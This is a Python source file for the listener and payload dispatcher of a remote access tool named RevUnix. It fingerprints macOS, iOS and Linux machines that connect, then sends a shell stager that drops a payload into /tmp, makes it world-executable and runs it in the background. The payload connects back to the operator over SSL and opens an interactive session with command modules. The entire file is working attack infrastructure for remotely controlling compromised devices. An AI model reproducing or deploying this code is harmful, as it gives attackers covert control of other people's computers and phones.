import socket, ssl, os, json, sys
import helper as h
import session
import binascii
from multihandler import multihandler

downloads_dir = "../downloads"

class Server:
    def __init__(self):
        if not os.path.isdir("downloads"):
            os.makedirs("downloads")
        self.macos_architectures = ["i386"]
        self.ios_architectures = ["arm64","armv7s"]
        self.host = None
        self.port = None
        self.debug = False
        self.is_multi = False
        self.modules_macos = self.import_modules("modules/commands/macOS")
        self.modules_ios = self.import_modules("modules/commands/iOS")
        self.modules_python = self.import_modules("modules/commands/python")
        self.modules_local = self.import_modules("modules/commands/local")
        self.multihandler = multihandler(self)


    def import_modules(self,path):
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).command()
                modules[m.name] = m
        return modules


    def get_modules(self,device_type):
        if device_type == "MacOS":
            result = self.modules_macos
        elif device_type == "iOS":
            result = self.modules_ios
        else:
            result = self.modules_python
        return result


    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = raw_input(h.info_general_raw("Set Listening Host (Leave blank for "+lhost+")>"))
            if choice != "":
                lhost = choice
            h.info_general("LHOST = " + lhost)
            while True:
                lport = raw_input(h.info_general_raw("Set Listening Port (Leave blank for 1337)>"))
                if not lport:
                    lport = 1337
                try:
                    lport = int(lport)
                except ValueError:
                    h.info_general("Invalid Port. Please Enter A Valid Integer Value.")
                    continue
                if lport < 1024:
                    h.info_general("Invalid Port. Please Enter A Port With Value >= 1024")
                    continue
                break
            h.info_general("LPORT = " + str(lport))
            self.host = socket.gethostbyname(lhost)
            self.port = lport
            return True
        except KeyboardInterrupt:
            return


    def start_single_handler(self):
        session = self.listen_for_stager()
        if session:
            session.interact()


    def start_multi_handler(self):
        self.multihandler.start_background_server()
        self.multihandler.interact()
        print "End Start MultiHandler."


    def craft_payload(self,device_arch):

        if not self.host:
            raise ValueError('Server Host IP Not Set. Please Set A Valid Host IP.')
        if not self.port:
            raise ValueError('Server Port Number Not Set. Please Set A Valid Port Number.')
        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":1}))
        if device_arch in self.macos_architectures:
            if self.is_multi == False:
                h.info_general("Detected MacOS!")
            f = open("resources/ruplmacos", "rb")
            payload = f.read()
            f.close()

            instructions = \
            "cat >/private/tmp/tmprupl;"+\
            "chmod 777 /private/tmp/tmprupl;"+\
            "mv /private/tmp/tmprupl /private/tmp/rupl;"+\
            "/private/tmp/rupl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        elif device_arch in self.ios_architectures:
            if self.is_multi == False:
                h.info_general("Detected iOS!")
            f = open("resources/ruplios", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/tmprupl;"+\
            "chmod 777 /tmp/tmprupl;"+\
            "mv /tmp/tmprupl /tmp/rupl;"+\
            "/tmp/rupl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        else:
            if self.is_multi == False:
                if device_arch == "Linux":
                    h.info_general("Detected Linux")
                elif "GET / HTTP/1.1" in device_arch:
                    raise ValueError("RevUnix does not exploit Safari Browser. RevUnix is a payload creation tool.\n Please look at the README.md file")
                else:
                    h.info_general("Device Unrecognized... \nTrying Python Payload...")
            f = open("resources/rupl.py", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/rupl.py;"+\
            "chmod 777 /var/tmp/rupl.py;"+\
            "python /tmp/rupl.py "+payload_parameter+" &\n"
            return (instructions,payload)


    def listen_for_stager(self):

        identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'

        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1)
        if self.is_multi == False:
            h.info_general("Listening On Port --> "+str(self.port)+".....")
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            s.close()
            return

        hostAddress = addr[0]
        if self.is_multi == False:
            h.info_general("Establishing Connection To "+hostAddress)
        conn.send(identification_shell_command)
        device_arch = conn.recv(128).strip()
        if not device_arch:
            return

        try:
            bash_stager, executable = self.craft_payload(device_arch)
        except Exception as e:
            h.info_error(str(e))
            raw_input("Please Press Enter To Continue Further!")
            return

        if self.is_multi == False:
            h.info_general("Sending Payload...")
        conn.send(bash_stager)
        conn.send(executable)
        conn.close()
        if self.is_multi == False:
            h.info_general("Establishing Secure Connection...")
        try:
            return self.listen_for_executable_payload(s)
        except ssl.SSLError as e:
            h.info_error("SSL error: " + str(e))
            return
        except Exception as e:
            h.info_error("Error: " + str(e))
            return


    def listen_for_executable_payload(self,s):

        ssl_con, hostAddress = s.accept()
        s.settimeout(5)
        ssl_sock = ssl.wrap_socket(ssl_con,
                                 server_side=True,
                                 certfile=".keys/server.crt",
                                 keyfile=".keys/server.key",
                                 ssl_version=ssl.PROTOCOL_SSLv23)
        raw = ssl_sock.recv(256)
        device_info = json.loads(raw)
        return session.Session(self,ssl_sock,device_info)


    def update_session(self,old_session):
        new_session = self.listen_for_stager()
        old_session.conn = new_session.conn
        old_session.hostname = new_session.hostname
        old_session.username = new_session.username
        old_session.type = new_session.type
